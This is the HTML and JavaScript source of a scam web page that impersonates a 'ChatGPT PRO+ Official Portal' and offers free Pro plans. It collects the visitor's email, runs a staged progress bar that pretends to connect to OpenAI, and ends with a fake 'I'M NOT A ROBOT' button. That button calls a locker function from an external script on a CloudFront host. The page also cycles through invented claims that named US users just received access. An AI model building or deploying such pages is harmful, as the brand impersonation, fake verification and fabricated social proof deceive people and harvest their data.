<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ChatGPT PRO+ | Official Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #10a37f; --bg: #000; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body, html { height: 100%; background: var(--bg); color: white; overflow: hidden; }

        /* BINDI/PARTICLE VIDEO BACKGROUND */
        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.5; }

        .wrapper { position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { width: 90%; max-width: 450px; background: rgba(18, 18, 18, 0.9); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; padding: 40px 25px; text-align: center; }

        /* CONSTANT LOGO */
        .header-logo { width: 65px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--primary)); }

        /* HIDDEN SECTIONS */
        #step-email, #step-processing, #step-captcha { display: none; }

        h1 { font-size: 24px; margin-bottom: 20px; font-weight: 900; }

        /* PLAN OPTIONS */
        .options-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .plan-card { background: #1a1a1a; border: 2px solid #333; padding: 20px 10px; border-radius: 15px; cursor: pointer; transition: 0.3s; position: relative; }
        .plan-card.selected { border-color: var(--primary); background: rgba(16, 163, 127, 0.1); }
        .plan-card h3 { font-size: 14px; margin-bottom: 5px; }
        .plan-card p { font-size: 11px; color: #888; }
        .tick-icon { position: absolute; top: 10px; right: 10px; width: 15px; height: 15px; border-radius: 50%; border: 1px solid #444; display: flex; align-items: center; justify-content: center; font-size: 8px; }
        .selected .tick-icon { background: var(--primary); border-color: var(--primary); content: '✓'; }

        /* INPUTS & BUTTONS */
        input[type="email"] { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #333; background: #000; color: white; margin-bottom: 20px; text-align: center; }
        .main-btn { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; }
        .main-btn:disabled { opacity: 0.5; }

        /* LOADER */
        .progress-container { margin: 20px 0; }
        .progress-bg { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: var(--primary); box-shadow: 0 0 10px var(--primary); }
        #status-msg { font-size: 12px; color: var(--primary); margin-top: 10px; font-family: monospace; }

        /* USA PROOFS */
        .proof { position: fixed; bottom: 20px; left: 20px; background: white; color: black; padding: 10px 15px; border-radius: 10px; font-size: 12px; font-weight: bold; display: flex; align-items: center; gap: 8px; animation: slideUp 0.5s ease; z-index: 1000; }
        @keyframes slideUp { from { transform: translateY(100px); } to { transform: translateY(0); } }
    </style>
</head>
<body>

    <canvas id="bg-canvas"></canvas>

    <div class="wrapper">
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" class="header-logo">

            <div id="step-plans">
                <h1>Select Pro Plan</h1>
                <div class="options-grid">
                    <div class="plan-card" onclick="selectPlan(this, '1 Month')">
                        <div class="tick-icon"></div>
                        <h3>1 Month</h3>
                        <p>Beta Trial</p>
                    </div>
                    <div class="plan-card" onclick="selectPlan(this, '1 Year')">
                        <div class="tick-icon"></div>
                        <h3>1 Year</h3>
                        <p>Neural Pro+</p>
                    </div>
                </div>
                <button class="main-btn" id="planBtn" disabled onclick="showEmailStep()">NEXT STEP</button>
            </div>

            <div id="step-email">
                <h1>Link Account</h1>
                <p style="color:#888; font-size:13px; margin-bottom:20px;">Enter your email to link the Pro license.</p>
                <input type="email" id="userEmail" placeholder="example@gmail.com">
                <button class="main-btn" onclick="showProcessing()">CLAIM ACCESS</button>
            </div>

            <div id="step-processing">
                <h1>Processing...</h1>
                <div class="progress-container">
                    <div class="progress-bg"><div class="progress-fill" id="bar"></div></div>
                    <div id="status-msg">Connecting to OpenAI...</div>
                </div>
            </div>

            <div id="step-captcha">
                <h1 style="color:#ff4b4b;">Verification Required</h1>
                <p style="color:#888; font-size:13px; margin-bottom:20px;">Click below to complete human verification.</p>
                <button class="main-btn" style="background:white; color:black;" onclick="openLockerFinal()">I'M NOT A ROBOT</button>
            </div>
        </div>
    </div>

    <div id="proof-wrap"></div>

    <audio id="tickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>

    <script type="text/javascript">

    </script>
    <script src="https://d19k1sh57v5k0g.cloudfront.net/b31d971.js"></script>

    <script>
        // BACKGROUND ANIMATION
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        let dots = [];
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        for(let i=0; i<70; i++) dots.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*2, v: Math.random()*0.4});
        function draw() {
            ctx.clearRect(0,0,canvas.width, canvas.height);
            ctx.fillStyle = '#10a37f';
            dots.forEach(d => {
                ctx.beginPath(); ctx.arc(d.x, d.y, d.r, 0, Math.PI*2); ctx.fill();
                d.y -= d.v; if(d.y < 0) d.y = canvas.height;
            });
            requestAnimationFrame(draw);
        }
        draw();

        // LOGIC FUNCTIONS
        function selectPlan(el, plan) {
            document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
            el.classList.add('selected');
            document.getElementById('planBtn').disabled = false;
            document.getElementById('tickSound').play();
        }

        function showEmailStep() {
            document.getElementById('step-plans').style.display = 'none';
            document.getElementById('step-email').style.display = 'block';
        }

        function showProcessing() {
            const email = document.getElementById('userEmail').value;
            if(!email.includes('@')) return alert('Please enter valid email');
            
            document.getElementById('step-email').style.display = 'none';
            document.getElementById('step-processing').style.display = 'block';

            let w = 0;
            const bar = document.getElementById('bar');
            const msg = document.getElementById('status-msg');
            const phrases = ["Syncing Email...", "Verifying Server Slots...", "Generating License...", "Finalizing Access..."];

            const timer = setInterval(() => {
                w += 0.8;
                bar.style.width = w + "%";
                if(w > 20) msg.innerText = phrases[0];
                if(w > 50) msg.innerText = phrases[1];
                if(w > 80) msg.innerText = phrases[2];
                if(w >= 100) {
                    clearInterval(timer);
                    document.getElementById('step-processing').style.display = 'none';
                    document.getElementById('step-captcha').style.display = 'block';
                }
            }, 40);
        }

        function openLockerFinal() {
            // Forcefully calls the locker script
            if (typeof call_locker === "function") {
                call_locker();
            } else {
                // Fallback agar script load na hui ho
                alert("Loading Secure Locker... Click again in 1 second.");
            }
        }

        // USA PROOFS
        const names = ["John D.", "Sarah W.", "Michael B.", "Emma S.", "David L."];
        const states = ["NY", "CA", "TX", "FL", "IL"];
        setInterval(() => {
            const n = names[Math.floor(Math.random()*names.length)];
            const s = states[Math.floor(Math.random()*states.length)];
            const wrap = document.getElementById('proof-wrap');
            wrap.innerHTML = `<div class="proof">🇺🇸 ${n} from ${s} just claimed 1 Year Access!</div>`;
            setTimeout(() => { wrap.innerHTML = ''; }, 4000);
        }, 10000);
    </script>
</body>
</html>
